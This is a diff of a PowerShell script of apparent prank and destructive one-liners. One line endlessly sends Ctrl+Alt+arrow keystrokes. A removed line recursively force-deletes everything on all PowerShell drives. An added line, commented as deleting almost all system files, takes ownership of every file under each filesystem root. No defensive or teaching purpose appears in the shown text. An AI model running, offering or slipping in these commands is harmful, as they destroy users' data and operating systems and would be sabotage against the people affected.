@@ -149,7 +149,7 @@ while ($true){
 #jw jako oneliner
 for(){@('^%{LEFT}', '^%{DOWN}', '^%{RIGHT}', '^%{UP}') | % {[System.Windows.Forms.SendKeys]::SendWait($_)}}
     
-#deliting all from all psproviders
-(Get-PSProvider | select -exp Drives | select -exp name) | % {ls $_":\" -r | ri -fo}
+#deliting all systemfiles, allmost
+(psprovider | where name -eq filesystem).drives.root | % {ls $_ -r -fo | select -exp fullname | % {$acl = get-acl $_; $acl.SetOwner([System.Security.Principal.NTAccount]::new((whoami))); Set-Acl $_ $acl;}}
 
 
